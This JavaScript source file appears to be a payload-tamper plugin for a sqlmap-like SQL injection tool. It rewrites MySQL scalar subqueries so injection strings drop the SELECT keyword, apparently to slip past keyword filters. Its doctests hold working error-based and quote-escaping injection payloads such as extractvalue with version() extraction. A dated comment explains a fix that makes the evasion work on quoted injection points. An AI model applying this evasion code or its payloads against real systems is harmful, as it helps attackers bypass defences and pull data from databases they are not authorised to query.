// 对标 sqlmap 无同名插件（本仓原创，MySQL 8 专用）：
// FROM-less 标量子查询 `(SELECT expr)` 内联化为 `expr`，消除 SELECT 关键字。
// MySQL 语义等价：SELECT 无 FROM 时只做表达式求值，去掉 SELECT 后在同一求值点
// 产生相同值（version()/CONCAT()/CAST() 等标量函数），extractvalue/updatexml
// 的报错取数形态因此保持同一报错内容（真机语义等价实证见 doctests 与靶场验证）。
// 带 FROM 的子查询（真取数）保持原样 —— 那类没有无 SELECT 的等价形式。
// 引号状态机：字符串/标识符字面量内的 "SELECT" 与括号一律不动。

/** 从 `from` 之后（不含）起，是否还存在同型引号 —— 有则该引号是字符串定界符，
 *  没有则它是逃逸闭合符（其后是代码层）。扫描时跳过 `\` 转义。
 * @param {string} s @param {number} from @param {string} q @returns {boolean} */
function hasClosingQuote(s, from, q) {
  for (let k = from + 1; k < s.length; k += 1) {
    if (s[k] === '\\') { k += 1; continue; }
    if (s[k] === q) return true;
  }
  return false;
}

// 逃逸闭合符的**尾部特征**：引号之后紧跟 SQL 关键字 / 行注释 / 右括号 / 分号 / 行尾。
// 反例（不能判逃逸）：`name='(SELECT x)'` 后跟 `(`；`CONCAT('__S__',...)` 后跟 `,`
// / 标识符 —— 那些是真正的字符串定界符。
const ESCAPE_TAIL = /^\s*(?:--|#|\/\*|\)|;)/;
const ESCAPE_END = /^\s*$/;
const ESCAPE_KW = /^\s+(?:and|or|xor|union|select|order|group|having|where|limit|from|set|values|procedure|into|extractvalue|updatexml|sleep|benchmark|if|case)\b/i;

/**
 * 该位置的引号是不是**逃逸闭合符**（闭合业务 SQL 的引号，其后是代码层）。
 * @param {string} s @param {number} i 引号所在下标 @returns {boolean}
 */
function isEscapeQuote(s, i) {
  const tail = s.slice(i + 1);
  return ESCAPE_TAIL.test(tail) || ESCAPE_END.test(tail) || ESCAPE_KW.test(tail);
}

/** 字符串字面量内容打码（保留引号与占位宽度）后，FROM 关键词是否真的出现在代码层。
 *  字符串里的 'FROM users' 不是表引用 —— 直接正则会把它误判成有 FROM 而放弃内联。 */
function hasTopLevelFrom(expr) {
  const masked = String(expr).replace(
    /'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"|`(?:[^`\\]|\\.)*`/g,
    (m) => m.replace(/[^\s]/g, '_'),
  );
  return /\bfrom\b/i.test(masked);
}

export const scalarselectinline = {
  name: 'scalarselectinline',
  description: 'FROM-less 标量子查询 (SELECT expr) → expr（消除 SELECT，MySQL 语义等价）',
  doctests: [
    {
      input: "1 AND extractvalue(1,concat(0x7e,(SELECT CONCAT('__S__',version(),'__E__'))))",
      output: "1 AND extractvalue(1,concat(0x7e,CONCAT('__S__',version(),'__E__')))",
    },
    { input: '1 AND (SELECT 1)=1', output: '1 AND 1=1' },
    // 有 FROM：真取数子查询，无等价形式，保持原样
    { input: "1 AND (SELECT name FROM users LIMIT 1)='x'", output: "1 AND (SELECT name FROM users LIMIT 1)='x'" },
    // 派生表：FROM 子句里的 (SELECT 1,2) 必须保持原样（内联会破坏语法）
    { input: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1', output: '1 AND (SELECT 1 FROM (SELECT 1,2) x)=1' },
    // 字符串字面量内的 "SELECT" 与括号不动
    { input: "1 AND name='(SELECT x)'", output: "1 AND name='(SELECT x)'" },
    // [2026-10-08] 逃逸闭合符 ≠ 字符串开始：字符串型注入点（`1' ... -- -`）的引号
    // 在**本片段内没有配对**，其后是代码层。此前整串被当字符串 ⇒ 这类 payload 100% 空转。
    { input: "1' AND (SELECT version())-- -", output: "1' AND version()-- -" },
    { input: "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -", output: "1' AND extractvalue(1,concat(0x7e,version()))-- -" },
    { input: '1 AND (SELECT version())=1', output: '1 AND version()=1' },
    // 嵌套：内层先内联，外层随后（幂等收敛）
    { input: '1 AND (SELECT CONCAT((SELECT 1)))=1', output: '1 AND CONCAT(1)=1' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    let s = String(payload ?? '');
    // 收敛循环：嵌套子查询外层先内联后，内层的 (SELECT ...) 在下一轮成为候选。
    // 每轮对全串做一次引号感知扫描；无候选时退出（幂等）。
    for (let pass = 0; pass < 8; pass += 1) {
      let out = '';
      let i = 0;
      let inStr = null;
      let changed = false;
      while (i < s.length) {
        const ch = s[i];
        if (inStr) {
          out += ch;
          if (ch === '\\') { out += s[i + 1] || ''; i += 2; continue; }
          if (ch === inStr) inStr = null;
          i += 1;
          continue;
        }
        if (ch === "'" || ch === '"' || ch === '`') {
          // ⚠️ [2026-10-08 修复] 未配对的引号是**逃逸闭合符**，不是字符串开始。
          //   `1' AND (SELECT version())-- -` 里那个 `'` 闭合的是业务 SQL 的引号，
          //   其后的 payload 处在**代码层**；旧逻辑无条件进字符串态 ⇒ 找不到第二个引号
          //   ⇒ 整串被当成字符串 ⇒ 这条插件在**所有带引号的注入 payload 上 100% 空转**。
          //   而字符串型注入点（`WHERE name='$x'`）恰恰必须带引号才能逃逸 —— 空转的
          //   正是最需要它的那一类。判据：向后扫（跳过 \ 转义）存在同型引号才算字符串。
          if (hasClosingQuote(s, i, ch) && !isEscapeQuote(s, i)) inStr = ch;
          out += ch;
          i += 1;
          continue;
        }
        if (ch === '(' && /^\(\s*select[\s(]/i.test(s.slice(i, i + 16))) {
          // 引号感知地找配对右括号
          let depth = 0;
          let j = i;
          let str = null;
          for (; j < s.length; j += 1) {
            const c2 = s[j];
            if (str) {
              if (c2 === '\\') { j += 1; continue; }
              if (c2 === str) str = null;
              continue;
            }
            if (c2 === "'" || c2 === '"' || c2 === '`') { str = c2; continue; }
            if (c2 === '(') depth += 1;
            else if (c2 === ')') {
              depth -= 1;
              if (depth === 0) break;
            }
          }
          if (j < s.length) {
            const inner = s.slice(i + 1, j);
            if (/^(\s*select\s+)([\s\S]+)$/i.test(inner) && !hasTopLevelFrom(inner)) {
              // FROM-less 标量子查询 → 内联（连外层括号一起去掉，少两个标点预算）
              out += inner.replace(/^\s*select\s+/i, '').trim();
              i = j + 1;
              changed = true;
              continue;
            }
            // 有 FROM（或形态不符）⇒ **整棵子树跳过**：内层的 (SELECT ...) 可能属于
            // 外层查询的 FROM 子句（派生表），从外面无法区分 —— 保守不动（实测：
            // (SELECT 1 FROM (SELECT 1,2) x) 的派生表被内联破坏过）。
            out += s.slice(i, j + 1);
            i = j + 1;
            continue;
          }
        }
        out += ch;
        i += 1;
      }
      s = out;
      if (!changed) break;
    }
    return s;
  },
};
export default scalarselectinline;
